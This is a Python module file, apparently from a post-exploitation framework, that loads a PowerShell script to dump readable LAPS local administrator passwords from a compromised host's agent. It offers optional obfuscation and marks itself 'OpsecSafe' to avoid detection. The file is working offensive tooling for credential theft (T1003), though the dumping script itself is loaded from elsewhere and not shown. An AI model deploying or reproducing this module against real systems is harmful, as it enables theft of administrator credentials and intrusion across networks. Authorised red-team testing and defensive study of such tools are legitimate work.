from __future__ import print_function

from builtins import str

from lib.common import helpers


class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Get-LAPSPasswords',
            'Author': ['kfosaaen', 'n0decaf'],
            'Description': "Dumps user readable LAPS passwords using kfosaaen's Get-LAPSPasswords.",
            'Software': '',
            'Techniques': ['T1003'],
            'Background' : True,
            'OutputExtension' : None,

            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'powershell',
            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1'
            ]
        }
        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Get-LAPSPasswords.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""
        moduleCode = f.read()
        f.close()
        script = moduleCode
        scriptEnd = "Get-LAPSPasswords"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
